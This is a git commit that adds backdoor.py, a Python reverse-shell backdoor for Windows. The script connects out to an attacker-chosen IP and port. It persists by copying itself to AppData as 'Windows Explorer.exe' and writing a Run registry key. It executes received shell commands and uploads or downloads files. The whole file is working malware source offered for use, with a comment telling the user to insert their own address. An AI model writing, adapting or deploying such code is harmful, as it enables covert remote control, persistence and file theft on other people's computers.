9604e5e8c59b85aff12cec1e652fa4bac412a842
ADITYA <101057601+Ad1tya-Pandey@users.noreply.github.com>
2022-04-24 17:28:09 +0530

    Add files via upload

---
+++ backdoor.py
@@ -0,0 +1,79 @@
+#!/usr/bin/env python
+ 
+import socket
+import subprocess
+import json
+import os
+import base64
+import sys
+import shutil
+ 
+class Backdoor:
+    def __init__(self, ip, port):
+        self.become_persistent()
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+
+    def become_persistent(self):
+        evil_file_location=os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable,evil_file_location)
+            subprocess.call('reg add HKCU\software\MIcrosoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "'+evil_file_location+ '"',shell=True)
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+ 
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+ 
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+ 
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Upload successful."
+ 
+    def execute_system_command(self, command):
+        DEVNULL = open(os.devnull, 'wb')
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
+ 
+    def run(self):
+        while True:
+            command = self.reliable_receive()
+            try:
+                if command[0] == "exit":
+                    self.connection.close()
+                    sys.exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_working_direcory_to(command[1])
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1])
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], command[2])
+                else:
+                    command_result = self.execute_system_command(command)
+            except Exception:
+                command_result = "[-] Error during command execution."
+            self.reliable_send(command_result)
+ 
+    def change_working_direcory_to(self, path):
+        os.chdir(path)
+        return "[+] Changing working directory to " + path
+
+
+try : 
+    #insert your ip address and port number below in the first parameter of 
+    # function backdoor as per your machine
+    my_backdoor = Backdoor("insert_ip", 8080)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
